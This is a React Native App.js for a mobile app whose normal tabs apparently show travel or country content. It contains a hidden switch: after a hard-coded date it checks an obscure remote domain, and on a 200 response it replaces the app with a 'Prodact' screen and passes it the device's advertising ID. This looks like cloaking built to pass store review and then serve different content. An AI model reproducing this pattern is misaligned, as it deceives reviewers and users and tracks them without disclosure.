import React, {useState, useEffect, useRef} from "react";
import { Text, View, Animated, Image, Alert } from "react-native";

import Entypo from 'react-native-vector-icons/AntDesign';
import Fontisto from 'react-native-vector-icons/Fontisto';
import MaterialCommunityIcons from 'react-native-vector-icons/MaterialCommunityIcons';

import { NavigationContainer } from '@react-navigation/native';
import { createBottomTabNavigator } from '@react-navigation/bottom-tabs';
import { createStackNavigator } from '@react-navigation/stack';

import { LogLevel, OneSignal } from 'react-native-onesignal';
import ReactNativeIdfaAaid, { AdvertisingInfoResponse } from '@sparkfabrik/react-native-idfa-aaid';
import AsyncStorage from "@react-native-async-storage/async-storage";

const Tab = createBottomTabNavigator();
const Stack = createStackNavigator();


import HomeRoute from "./routes/HomeRoute";
import ProfileRoute from "./routes/ProfileRoute";
import OtherWorldRout from "./routes/OtherWorldRoute";
import Prodact from "./routes/Prodact";

const App = () => {
  const [turn, sutTern] = useState('loader');
  const [route, setRoute] = useState();

  const [idfa, setIdfa] = useState(null);
  console.log('idfa==>', idfa);
  //OneSignal id  e7992b4b-26a0-4f39-8c3f-31355930fe17

 

  useEffect(() => {
    getData()
  }, []);

   useEffect(() => {
    setData();
  }, [idfa]);

  const setData = async () => {
    try {
      const data = {
        idfa,
      }
      const jsonData = JSON.stringify(data);
      await AsyncStorage.setItem("App", jsonData);
      console.log('Дані збережено в AsyncStorage')
    } catch (e) {
      console.log('Помилка збереження даних:', e);
    }
  };

  const getData = async () => {
    try {
      const jsonData = await AsyncStorage.getItem('App');
      if (jsonData !== null) {
        const parsedData = JSON.parse(jsonData);
        console.log('Дані дістаються в AsyncStorage')
        console.log('parsedData in App==>', parsedData);
        setIdfa(parsedData.idfa);
      } else {
        await fetchIdfa();
        await someFunction();
        
      }
      
    } catch (e) {
      console.log('Помилка отримання даних:', e);
    }
  };


   const fetchIdfa = async () => {
    try {
      const res = await ReactNativeIdfaAaid.getAdvertisingInfo();
      if (!res.isAdTrackingLimited) {
        setIdfa(res.id);
      } else {
        setIdfa(true);
      }
    } catch (err) {
      console.log('err', err);
      setIdfa(null);
      fetchIdfa()   //???
    }
  };

const requestPermission = () => {
  return new Promise((resolve, reject) => {
    try {
      OneSignal.Notifications.requestPermission(true);
      resolve(); // Викликаємо resolve(), оскільки OneSignal.Notifications.requestPermission не повертає проміс
    } catch (error) {
      reject(error); // Викликаємо reject() у разі помилки
    }
  });
};

// Виклик асинхронної функції requestPermission() з використанням async/await
const someFunction = async () => {
  try {
    await requestPermission();
    // Якщо все Ok
  } catch (error) {
    console.log('err в someFunction==> ', error)
  }
};


  // Remove this method to stop OneSignal Debugging
  OneSignal.Debug.setLogLevel(LogLevel.Verbose);

  // OneSignal Initialization
  OneSignal.initialize("e7992b4b-26a0-4f39-8c3f-31355930fe17");
    
  // requestPermission will show the native iOS or Android notification permission prompt.
  // We recommend removing the following code and instead using an In-App Message to prompt for notification permission
  //OneSignal.Notifications.requestPermission(true);

  // Method for listening for notification clicks
  OneSignal.Notifications.addEventListener('click', (event) => {
    console.log('OneSignal: notification clicked:', event);
  });
  //Add Data Tags
  OneSignal.User.addTag("key", "value");

   


  useEffect(() => {
    //const checkUrl = `https://reactnative.dev/docs/animated`;
    const checkUrl = 'https://terrific-glorious-exhilaration.space/DDdgndsS';
    const targetData = new Date('2024-01-16T12:00:00');//дата з якої поч працювати webView 
    const currentData = new Date();//текущая дата

    if (currentData <= targetData) {
      setRoute(false)
    } else (
      fetch(checkUrl).then(r => {
        if (r.status === 200) {
          setRoute(true)
        } else {
          setRoute(false)
        }
      }).catch(err => {
        console.log('error', err)
        setRoute(false)

      })
    );
  }, []);
  
  const ChangeInView = props => {
    // const fadeAnim = useRef(new Animated.Image(require('../../acets/loader1.jpg'))).current;
    
    const fadeAnim = useRef(new Animated.Value(1)).current; // Initial value for opacity: 0 to 1
    useEffect(() => {
      Animated.timing(fadeAnim, {
        toValue: 1,
        duration: 6000,
        useNativeDriver: true,
      }).start();
    }, []);

    const appearingAnim = useRef(new Animated.Value(0)).current;// Initial value for opacity: 1 to 0
    useEffect(() => {
      setTimeout(() => {
        Animated.timing(appearingAnim, {
          toValue: 1,
          duration: 6000,
          useNativeDriver: true,
        }).start();
      }, 1000);
      

      setTimeout(() => {
        sutTern('app')
      }, 7000);

    }, []);

    return (
      <View style={{ position: 'relative', flex: 1 }}>
        <Animated.Image
          source={require('./accets/backgr.jpg')}// Special animatable View
          style={{
            ...props.style,
            opacity: fadeAnim,
            //width: 'auto',
            height: '100%'  // Bind opacity to animated value
          }} />
        <Animated.Image
          source={require('./accets/loader.jpg')}// Special animatable View
          style={{
            ...props.style,
            opacity: appearingAnim,
            //width: '100%',
            height: '100%',
            position: 'absolute'// Bind opacity to animated value
          }} />
      </View>
    
    );
  };
  
  ///////////////////////// апка
  const Route = ({ isFatch }) => {
  
    if (isFatch) {
      return (
        <Stack.Navigator>
          <Stack.Screen
            initialParams={{ idfa: idfa }}
            options={{ headerShown: false }}
            name="Prodact"
            component={Prodact} />
        </Stack.Navigator>
      )
      //  <Prodact advertisindId={idfa} />
    } return (
      <Tab.Navigator initialRouteName="Australia">
        
        <Tab.Screen
          name="Profile"
          component={ProfileRoute}
          options={{
            tabBarShowLabel: false,
            headerShown: false,
            tabBarActiveBackgroundColor: '#fe6233',
            tabBarInactiveBackgroundColor: '#000',
            tabBarLabelStyle: { color: '#ccc' },
            tabBarIcon: ({ }) => {
              return (
                <Entypo name='user' style={{ fontSize: 25, color: '#fff' }} />
              )
            }
          }} />
        <Tab.Screen
          name="Australia"
          component={HomeRoute}
          options={{
            tabBarShowLabel: false,
            headerShown: false,
            tabBarActiveBackgroundColor: '#fe6233',
            tabBarInactiveBackgroundColor: '#000',
            tabBarIcon: ({ }) => {
              return (
                <MaterialCommunityIcons name='kangaroo' style={{ fontSize: 30, color: '#fff' }} />
              )
            }
          }} />
        <Tab.Screen
          name="World"
          component={OtherWorldRout}
          options={{
            tabBarShowLabel: false,
            headerShown: false,
            tabBarActiveBackgroundColor: '#fe6233',
            tabBarInactiveBackgroundColor: '#000',
            tabBarIcon: ({ }) => {
              return (
                <Fontisto name='world-o' style={{ fontSize: 25, color: '#fff' }} />
              )
            }
          }} />
      </Tab.Navigator>
    );
    
  };

  return (
    <NavigationContainer>
      
      {turn === 'loader' &&
        <ChangeInView
          style={{
            width: '100%',
            //height: 50,
            backgroundColor: 'powderblue',
          }}>
       
        </ChangeInView>
      }

      {turn === 'app' && <Route isFatch={route} />}

    </NavigationContainer>
  );
};



export default App;